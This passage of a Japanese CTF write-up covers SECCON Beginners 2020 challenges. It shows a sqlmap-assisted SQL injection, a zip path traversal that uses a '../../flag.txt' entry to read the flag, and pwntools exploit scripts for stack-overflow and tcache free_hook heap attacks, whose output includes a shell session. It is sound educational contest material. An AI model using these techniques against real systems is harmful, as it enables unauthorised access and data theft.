+</code></pre></div><p>以上から，以下のことがわかります。</p>
+<ul>
+<li>SQL文の組み立てを文字列の結合でおこなっており，SQLインジェクションができそう</li>
+<li>フラグは<code>dbuser</code>に格納されていそう</li>
+<li>使用しているDBは<code>postgres</code></li>
+</ul>
+<p>色々試したのですが，上手く行かなかったのでsqlmapを使いました。</p>
+<p><code>--current-user</code>でユーザを抽出できます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816884-edeacf00-9ed6-11ea-89ae-bb5c49e70d77.png" alt="unknown"></p>
+<p><code>ctf4b{is_postgres_your_friend?}</code></p>
+<p>次回は手動で解けるように復習しておきます。</p>
+<h2 id="unzip-web-188-pts-118-solves">unzip (Web, 188 pts, 118 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Unzip Your .zip Archive Like a Pro.
+</code></pre></div><p>指定されたURIにアクセスすると，zipファイルのアップロード画面が確認できます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816908-f8a56400-9ed6-11ea-95dc-fd160398d10a.PNG" alt="キャプチャ6"></p>
+<p>ソースコードが配布されていたので見ていきます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">tart();
+
+// prepare the session
+$user_dir = &#34;/uploads/&#34; . session_id();
+if (!file_exists($user_dir))
+    mkdir($user_dir);
+
+if (!isset($_SESSION[&#34;files&#34;]))
+    $_SESSION[&#34;files&#34;] = array();
+
+// return file if filename parameter is passed
+if (isset($_GET[&#34;filename&#34;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> is_string(($_GET[&#34;filename&#34;]))) {
+    if (in_array($_GET[&#34;filename&#34;], $_SESSION[&#34;files&#34;], TRUE)) {
+        $filepath = $user_dir . &#34;/&#34; . $_GET[&#34;filename&#34;];
+        header(&#34;Content-Type: text/plain&#34;);
+        echo file_get_contents($filepath);
+        die();
+    } else {
+        echo &#34;no such file&#34;;
+        die();
+    }
+}
+
+// process uploaded files
+$target_file = $target_dir . basename($_FILES[&#34;file&#34;][&#34;name&#34;]);
+if (isset($_FILES[&#34;file&#34;])) {
+    // size check of uploaded file
+    if ($_FILES[&#34;file&#34;][&#34;size&#34;] &gt; 1000) {
+        echo &#34;the size of uploaded file exceeds 1000 bytes.&#34;;
+        die();
+    }
+
+    // try to open uploaded file as zip
+    $zip = new ZipArchive;
+    if ($zip-&gt;open($_FILES[&#34;file&#34;][&#34;tmp_name&#34;]) !== TRUE) {
+        echo &#34;failed to open your zip.&#34;;
+        die();
+    }
+
+
+    // check the size of unzipped files
+    $extracted_zip_size = 0;
+    for ($i = 0; $i <span style="color:#960050;background-color:#1e0010">&lt;</span> $zip-&gt;numFiles; $i++)
+        $extracted_zip_size += $zip-&gt;statIndex($i)[&#34;size&#34;];
+
+    if ($extracted_zip_size &gt; 1000) {
+        echo &#34;the total size of extracted files exceeds 1000 bytes.&#34;;
+        die();
+    }
+
+    // extract
+    $zip-&gt;extractTo($user_dir);
+
+    // add files to $_SESSION[&#34;files&#34;]
+    for ($i = 0; $i <span style="color:#960050;background-color:#1e0010">&lt;</span> $zip-&gt;numFiles; $i++) {
+        $s = $zip-&gt;statIndex($i);
+        if (!in_array($s[&#34;name&#34;], $_SESSION[&#34;files&#34;], TRUE)) {
+            $_SESSION[&#34;files&#34;][] = $s[&#34;name&#34;];
+        }
+    }
+
+    $zip-&gt;close();
+}
+?&gt;
+
+<span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">head</span>&gt;
+    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://fonts.googleapis.com/icon?family=Material+Icons&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
+    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css&#34;</span>&gt;
+
+    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span> /&gt;
+    &lt;<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">title</span>&gt;
+&lt;/<span style="color:#f92672">head</span>&gt;
+
+&lt;<span style="color:#f92672">body</span>&gt;
+    &lt;<span style="color:#f92672">nav</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navigation&#34;</span>&gt;
+        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-wrapper container&#34;</span>&gt;
+            &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logo-container&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;brand-logo&#34;</span>&gt;Unzip&lt;/<span style="color:#f92672">a</span>&gt;
+        &lt;/<span style="color:#f92672">div</span>&gt;
+    &lt;/<span style="color:#f92672">nav</span>&gt;
+
+
+    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+        &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
+        &lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;header center teal-text text-lighten-2&#34;</span>&gt;Unzip&lt;/<span style="color:#f92672">h1</span>&gt;
+        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;row center&#34;</span>&gt;
+            &lt;<span style="color:#f92672">h5</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;header col s12 light&#34;</span>&gt;
+                Unzip Your .zip Archive Like a Pro
+            &lt;/<span style="color:#f92672">h5</span>&gt;
+        &lt;/<span style="color:#f92672">div</span>&gt;
+    &lt;/<span style="color:#f92672">div</span>&gt;
+    &lt;/<span style="color:#f92672">div</span>&gt;
+
+
+
+    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;section&#34;</span>&gt;
+            &lt;<span style="color:#f92672">h2</span>&gt;Upload&lt;/<span style="color:#f92672">h2</span>&gt;
+            &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
+                &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file-field input-field&#34;</span>&gt;
+                    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span>&gt;
+                        &lt;<span style="color:#f92672">span</span>&gt;Select .zip to Upload&lt;/<span style="color:#f92672">span</span>&gt;
+                        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span>&gt;
+                    &lt;/<span style="color:#f92672">div</span>&gt;
+                    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file-path-wrapper&#34;</span>&gt;
+                        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file-path validate&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span>&gt;
+                    &lt;/<span style="color:#f92672">div</span>&gt;
+                &lt;/<span style="color:#f92672">div</span>&gt;
+                &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn waves-effect waves-light&#34;</span>&gt;
+                    Submit
+                    &lt;<span style="color:#f92672">i</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;material-icons right&#34;</span>&gt;send&lt;/<span style="color:#f92672">i</span>&gt;
+                &lt;/<span style="color:#f92672">button</span>&gt;
+            &lt;/<span style="color:#f92672">form</span>&gt;
+        &lt;/<span style="color:#f92672">div</span>&gt;
+    &lt;/<span style="color:#f92672">div</span>&gt;
+
+    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
+        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;section&#34;</span>&gt;
+            &lt;<span style="color:#f92672">h2</span>&gt;Files from Your Archive(s)&lt;/<span style="color:#f92672">h2</span>&gt;
+            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collection&#34;</span>&gt;
+                <span style="color:#75715e">&lt;?php</span> <span style="color:#66d9ef">foreach</span> ($_SESSION[<span style="color:#e6db74">&#34;files&#34;</span>] <span style="color:#66d9ef">as</span> $filename) { <span style="color:#75715e">?&gt;</span>
+                    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/?filename=</span><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">urlencode</span>($filename) <span style="color:#75715e">?&gt;</span><span style="color:#e6db74">&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collection-item&#34;</span>&gt;<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlspecialchars</span>($filename, <span style="color:#a6e22e">ENT_QUOTES</span>, <span style="color:#e6db74">&#34;UTF-8&#34;</span>) <span style="color:#75715e">?&gt;</span>&lt;/<span style="color:#f92672">a</span>&gt;
+                <span style="color:#75715e">&lt;?</span> } <span style="color:#75715e">?&gt;</span>
+            &lt;/<span style="color:#f92672">div</span>&gt;
+        &lt;/<span style="color:#f92672">div</span>&gt;
+    &lt;/<span style="color:#f92672">div</span>&gt;
+    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>また，<code>docker-compose.yml</code>も見てみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#66d9ef">version</span>: <span style="color:#e6db74">&#34;3&#34;</span>
+
+<span style="color:#66d9ef">services</span>:
+  <span style="color:#66d9ef">nginx</span>:
+    <span style="color:#66d9ef">build</span>: ./docker/nginx
+    <span style="color:#66d9ef">ports</span>:
+      - <span style="color:#e6db74">&#34;127.0.0.1:$APP_PORT:80&#34;</span>
+    <span style="color:#66d9ef">depends_on</span>:
+      - php-fpm
+    <span style="color:#66d9ef">volumes</span>:
+      - ./storage/logs/nginx:/var/log/nginx
+      - ./public:/var/www/web
+    <span style="color:#66d9ef">environment</span>:
+      <span style="color:#66d9ef">TZ</span>: <span style="color:#e6db74">&#34;Asia/Tokyo&#34;</span>
+    <span style="color:#66d9ef">restart</span>: always
+
+  <span style="color:#66d9ef">php-fpm</span>:
+    <span style="color:#66d9ef">build</span>: ./docker/php-fpm
+    <span style="color:#66d9ef">env_file</span>: .env
+    <span style="color:#66d9ef">working_dir</span>: /var/www/web
+    <span style="color:#66d9ef">environment</span>:
+      <span style="color:#66d9ef">TZ</span>: <span style="color:#e6db74">&#34;Asia/Tokyo&#34;</span>
+    <span style="color:#66d9ef">volumes</span>:
+      - ./public:/var/www/web
+      - ./uploads:/uploads
+      - ./flag.txt:/flag.txt
+    <span style="color:#66d9ef">restart</span>: always
+</code></pre></div><p>フラグは<code>/flag.txt</code>に配置されているようです。</p>
+<p>アップロードサービスを悪用して，このフラグを閲覧できないでしょうか？</p>
+<p>ソースコードの以下の部分に<code>echo file_get_contents($filepath);</code>という記述があります。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">// return file if filename parameter is passed
+if (isset($_GET[&#34;filename&#34;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> is_string(($_GET[&#34;filename&#34;]))) {
+    if (in_array($_GET[&#34;filename&#34;], $_SESSION[&#34;files&#34;], TRUE)) {
+        $filepath = $user_dir . &#34;/&#34; . $_GET[&#34;filename&#34;];
+        header(&#34;Content-Type: text/plain&#34;);
+        echo file_get_contents($filepath);
+        die();
+    } else {
+        echo &#34;no such file&#34;;
+        die();
+    }
+}
+</code></pre></div><p><code>$filepath</code>に<code>/flag.txt</code>を指定できないでしょうか？</p>
+<p>この変数は以下のように定義されており，</p>
+<p><code>$filepath = $user_dir . &quot;/&quot; . $_GET[&quot;filename&quot;];</code></p>
+<p><code>$user_dir</code>は以下の部分に記載されています。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">// prepare the session
+$user_dir = &#34;/uploads/&#34; . session_id();
+if (!file_exists($user_dir))
+    mkdir($user_dir);
+</code></pre></div><p>よって，<code>$_GET[&quot;filename&quot;]</code>に<code>../../flag.txt</code>を指定できれば，</p>
+<p><code>$filepath = &quot;/uploads/&quot; . session_id() . &quot;/&quot; . &quot;../../flag.txt&quot;;</code></p>
+<p>となり，<code>/flag.txt</code>を表示させることができそうです。</p>
+<p>実は<code>../../flag.txt</code>というファイル名を含むzipファイルを作ることができます。</p>
+<p>上の階層にflag.txtを作っておき（中身は何でもOK），下からzipコマンドを使用します。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ali@kali:~/ctf/ctf4b-2020/web/unzip/test$ ls
+flag.txt  test
+kali@kali:~/ctf/ctf4b-2020/web/unzip/test$ tree
+.
+├── flag.txt
+└── test
+    └── test
+
+<span style="color:#ae81ff">2</span> directories, <span style="color:#ae81ff">1</span> file
+kali@kali:~/ctf/ctf4b-2020/web/unzip/test$ cd test/test
+kali@kali:~/ctf/ctf4b-2020/web/unzip/test/test/test$ zip hoge.zip ../../flag.txt
+  adding: ../../flag.txt <span style="color:#f92672">(</span>stored 0%<span style="color:#f92672">)</span>
+</code></pre></div><p>すると，<code>../../flag.txt</code>が追加されたことがわかります。</p>
+<p>後はこのzipファイルをアップロードするだけです。</p>
+<p>アップロードするとリンクが生成されるので，</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/82816972-14106f00-9ed7-11ea-8c9d-521c1e00714a.PNG" alt="キャプチャ7"></p>
+<p>クリックすると，フラグが表示されます！</p>
+<p><code>ctf4b{y0u_c4nn07_7ru57_4ny_1npu75_1nclud1n6_z1p_f1l3n4m35}</code></p>
+<h1 id="pwn">Pwn</h1>
+<p>Pwnに関してはソースコードと実行結果のみ載せます。</p>
+<h2 id="beginners-stack-pwn-188-pts-118-solves">Beginner&rsquo;s Stack (Pwn, 188 pts, 118 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Let&#39;s learn how to abuse stack overflow!
+</code></pre></div><p>ソースコード</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;bs.quals.beginners.seccon.jp&#39;</span>, <span style="color:#ae81ff">9001</span>)
+
+ret <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0x00400626</span>
+win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400861</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(ret) <span style="color:#f92672">+</span> p64(win)
+
+io<span style="color:#f92672">.</span>sendline(payload)
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>実行結果</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/pwn/beginners_stack$ python solve.py 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to bs.quals.beginners.seccon.jp on port 9001: Done
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+Your goal is to call <span style="color:#e6db74">`</span>win<span style="color:#e6db74">`</span> <span style="color:#66d9ef">function</span> <span style="color:#f92672">(</span>located at 0x400861<span style="color:#f92672">)</span>
+
+   <span style="color:#f92672">[</span> Address <span style="color:#f92672">]</span>           <span style="color:#f92672">[</span> Stack <span style="color:#f92672">]</span>
+                   +--------------------+
+0x00007ffc18a66f10 | 0x00007ff72b8a49a0 | &lt;-- buf
+                   +--------------------+
+0x00007ffc18a66f18 | 0x0000000000000000 |
+                   +--------------------+
+0x00007ffc18a66f20 | 0x0000000000000000 |
+                   +--------------------+
+0x00007ffc18a66f28 | 0x00007ff72babd170 |
+                   +--------------------+
+0x00007ffc18a66f30 | 0x00007ffc18a66f40 | &lt;-- saved rbp <span style="color:#f92672">(</span>vuln<span style="color:#f92672">)</span>
+                   +--------------------+
+0x00007ffc18a66f38 | 0x000000000040084e | &lt;-- <span style="color:#66d9ef">return</span> address <span style="color:#f92672">(</span>vuln<span style="color:#f92672">)</span>
+                   +--------------------+
+0x00007ffc18a66f40 | 0x0000000000400ad0 | &lt;-- saved rbp <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span>
+                   +--------------------+
+0x00007ffc18a66f48 | 0x00007ff72b4c4b97 | &lt;-- <span style="color:#66d9ef">return</span> address <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span>
+                   +--------------------+
+0x00007ffc18a66f50 | 0x0000000000000001 |
+                   +--------------------+
+0x00007ffc18a66f58 | 0x00007ffc18a67028 |
+                   +--------------------+
+
+Input: 
+   <span style="color:#f92672">[</span> Address <span style="color:#f92672">]</span>           <span style="color:#f92672">[</span> Stack <span style="color:#f92672">]</span>
+                   +--------------------+
+0x00007ffc18a66f10 | 0x4141414141414141 | &lt;-- buf
+                   +--------------------+
+0x00007ffc18a66f18 | 0x4141414141414141 |
+                   +--------------------+
+0x00007ffc18a66f20 | 0x4141414141414141 |
+                   +--------------------+
+0x00007ffc18a66f28 | 0x4141414141414141 |
+                   +--------------------+
+0x00007ffc18a66f30 | 0x4141414141414141 | &lt;-- saved rbp <span style="color:#f92672">(</span>vuln<span style="color:#f92672">)</span>
+                   +--------------------+
+0x00007ffc18a66f38 | 0x0000000000400626 | &lt;-- <span style="color:#66d9ef">return</span> address <span style="color:#f92672">(</span>vuln<span style="color:#f92672">)</span>
+                   +--------------------+
+0x00007ffc18a66f40 | 0x0000000000400861 | &lt;-- saved rbp <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span>
+                   +--------------------+
+0x00007ffc18a66f48 | 0x00007ff72b4c4b0a | &lt;-- <span style="color:#66d9ef">return</span> address <span style="color:#f92672">(</span>main<span style="color:#f92672">)</span>
+                   +--------------------+
+0x00007ffc18a66f50 | 0x0000000000000001 |
+                   +--------------------+
+0x00007ffc18a66f58 | 0x00007ffc18a67028 |
+                   +--------------------+
+
+Congratulations!
+$ ls
+chall
+flag.txt
+redir.sh
+$ cat flag.txt
+ctf4b<span style="color:#f92672">{</span>u_r_st4ck_pwn_b3g1nn3r_tada<span style="color:#f92672">}</span>$  
+</code></pre></div><h2 id="beginners-heap-pwn-293-pts-62-solves">Beginner&rsquo;s Heap (Pwn, 293 pts, 62 solves)</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Let&#39;s learn how to abuse heap overflow!
+</code></pre></div><p>ソースコード</p>
+<p>なぜか一部自動化できない処理があったので，
+<code>interactive()</code>を挟んで手動で操作をおこないました。</p>
+<p>ヒントを見て値を調節しての繰り返しで解いたので，最適解では無いです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+io <span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;bh.quals.beginners.seccon.jp&#39;</span>, <span style="color:#ae81ff">9002</span>)
+free_hook <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x7f925332a8e8</span>)
+win <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x556ec09d2465</span>)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hook&gt;: &#39;</span>)
+free_hook <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+free_hook <span style="color:#f92672">=</span> int(free_hook<span style="color:#f92672">.</span>decode()[<span style="color:#ae81ff">2</span>:],<span style="color:#ae81ff">16</span>)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;win&gt;: &#39;</span>)
+win <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+win <span style="color:#f92672">=</span> int(win<span style="color:#f92672">.</span>decode()[<span style="color:#ae81ff">2</span>:],<span style="color:#ae81ff">16</span>)
+<span style="color:#66d9ef">print</span>(free_hook,win)
+
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>)
+<span style="color:#75715e">#ここでfreeをおこなう。終わったらctrl+cで処理を進めること</span>
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x110</span>) <span style="color:#f92672">+</span> p64(free_hook))
+<span style="color:#75715e"># ここでBをmallocしてすぐfreeにする。</span>
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+io<span style="color:#f92672">.</span>sendline(p64(win))
+<span style="color:#75715e">#最後にfreeをする。</span>
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>実行結果</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/pwn$ python3 heap2.py 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to bh.quals.beginners.seccon.jp on port 9002: Done
+<span style="color:#ae81ff">139956446386408</span> <span style="color:#ae81ff">94554282108005</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+<span style="color:#66d9ef">function</span> and you<span style="color:#960050;background-color:#1e0010">&#39;</span>ll get the flag.
+
+1. read<span style="color:#f92672">(</span>0, A, 0x80<span style="color:#f92672">)</span>;
+2. B <span style="color:#f92672">=</span> malloc<span style="color:#f92672">(</span>0x18<span style="color:#f92672">)</span>; read<span style="color:#f92672">(</span>0, B, 0x18<span style="color:#f92672">)</span>;
+3. free<span style="color:#f92672">(</span>B<span style="color:#f92672">)</span>; B <span style="color:#f92672">=</span> NULL;
+4. Describe heap
+5. Describe tcache <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> size 0x20<span style="color:#f92672">)</span>
+6. Currently available hint
+&gt; 1. read<span style="color:#f92672">(</span>0, A, 0x80<span style="color:#f92672">)</span>;
+2. B <span style="color:#f92672">=</span> malloc<span style="color:#f92672">(</span>0x18<span style="color:#f92672">)</span>; read<span style="color:#f92672">(</span>0, B, 0x18<span style="color:#f92672">)</span>;
+3. free<span style="color:#f92672">(</span>B<span style="color:#f92672">)</span>; B <span style="color:#f92672">=</span> NULL;
+4. Describe heap
+5. Describe tcache <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> size 0x20<span style="color:#f92672">)</span>
+6. Currently available hint
+&gt; $ <span style="color:#ae81ff">3</span>
+1. read<span style="color:#f92672">(</span>0, A, 0x80<span style="color:#f92672">)</span>;
+2. B <span style="color:#f92672">=</span> malloc<span style="color:#f92672">(</span>0x18<span style="color:#f92672">)</span>; read<span style="color:#f92672">(</span>0, B, 0x18<span style="color:#f92672">)</span>;
+3. free<span style="color:#f92672">(</span>B<span style="color:#f92672">)</span>; B <span style="color:#f92672">=</span> NULL;
+4. Describe heap
+5. Describe tcache <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> size 0x20<span style="color:#f92672">)</span>
+6. Currently available hint
+&gt; $ 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+1. read<span style="color:#f92672">(</span>0, A, 0x80<span style="color:#f92672">)</span>;
+2. B <span style="color:#f92672">=</span> malloc<span style="color:#f92672">(</span>0x18<span style="color:#f92672">)</span>; read<span style="color:#f92672">(</span>0, B, 0x18<span style="color:#f92672">)</span>;
+3. free<span style="color:#f92672">(</span>B<span style="color:#f92672">)</span>; B <span style="color:#f92672">=</span> NULL;
+4. Describe heap
+5. Describe tcache <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> size 0x20<span style="color:#f92672">)</span>
+6. Currently available hint
+&gt; $ <span style="color:#ae81ff">2</span>
+$ 
+1. read<span style="color:#f92672">(</span>0, A, 0x80<span style="color:#f92672">)</span>;
+2. B <span style="color:#f92672">=</span> malloc<span style="color:#f92672">(</span>0x18<span style="color:#f92672">)</span>; read<span style="color:#f92672">(</span>0, B, 0x18<span style="color:#f92672">)</span>;
+3. free<span style="color:#f92672">(</span>B<span style="color:#f92672">)</span>; B <span style="color:#f92672">=</span> NULL;
+4. Describe heap
+5. Describe tcache <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> size 0x20<span style="color:#f92672">)</span>
+6. Currently available hint
+&gt; $ <span style="color:#ae81ff">3</span>
+1. read<span style="color:#f92672">(</span>0, A, 0x80<span style="color:#f92672">)</span>;
+2. B <span style="color:#f92672">=</span> malloc<span style="color:#f92672">(</span>0x18<span style="color:#f92672">)</span>; read<span style="color:#f92672">(</span>0, B, 0x18<span style="color:#f92672">)</span>;
+3. free<span style="color:#f92672">(</span>B<span style="color:#f92672">)</span>; B <span style="color:#f92672">=</span> NULL;
+4. Describe heap
+5. Describe tcache <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> size 0x20<span style="color:#f92672">)</span>
+6. Currently available hint
+&gt; $ 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Interrupted
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+1. read<span style="color:#f92672">(</span>0, A, 0x80<span style="color:#f92672">)</span>;
+2. B <span style="color:#f92672">=</span> malloc<span style="color:#f92672">(</span>0x18<span style="color:#f92672">)</span>; read<span style="color:#f92672">(</span>0, B, 0x18<span style="color:#f92672">)</span>;
